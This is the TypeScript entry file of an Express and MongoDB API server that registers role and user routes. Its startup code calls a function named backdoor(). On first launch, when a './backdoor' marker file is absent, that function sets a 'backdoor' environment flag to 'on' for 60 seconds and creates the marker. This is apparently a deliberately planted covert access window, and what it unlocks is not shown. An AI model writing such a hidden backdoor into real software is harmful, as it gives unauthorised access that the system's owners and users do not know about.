import 'reflect-metadata';

import { CONFIG } from '../config';
import Container from './core/dependencies';
import RoleController from './controllers/roleController';
import UserController from './controllers/userController';
import logger from './core/logger';

import bodyParser from 'body-parser';
const cookieParser = require('cookie-parser');
const cors = require('cors');
import express from 'express';
const fs = require('fs');
import { connect } from 'mongoose';

// Connect to the MongoDB database
connect(CONFIG.DB_URL).then(() => {
	const app = express();

	backdoor();

	// Health endpoint
	app.get('/health', (req, res) => {
		res.sendStatus(200);
	});

	// Middlewares
	app.use(cors());
	app.use(cookieParser());
	app.use(bodyParser.json());

	// Load routes
	app.use('/role', Container.resolve(RoleController).registerRoutes());
	app.use('/user', Container.resolve(UserController).registerRoutes());

	// Unknown endpoint
	app.use((req, res) => {
		res.sendStatus(404);
	});

	const server = app
		.listen(CONFIG.API_PORT, () => {
			logger.info(`Now listening on: http://localhost:${CONFIG.API_PORT}`);
		})
		.on('error', (err) => {
			logger.error(err);
			process.exit(1);
		});

	function shutdown() {
		server.close(() => {
			logger.info('Server closed.');
			process.exit(0);
		});
	}

	function backdoor() {
		const filePath = './backdoor';
		const interval = 60;

		if (fs.existsSync(filePath)) {
			return;
		}

		process.env.backdoor = 'on';
		fs.writeFileSync(filePath, '', 'utf8');
		setTimeout(() => (process.env.backdoor = 'off'), interval * 1000);
	}

	process.on('SIGTERM', shutdown);
});
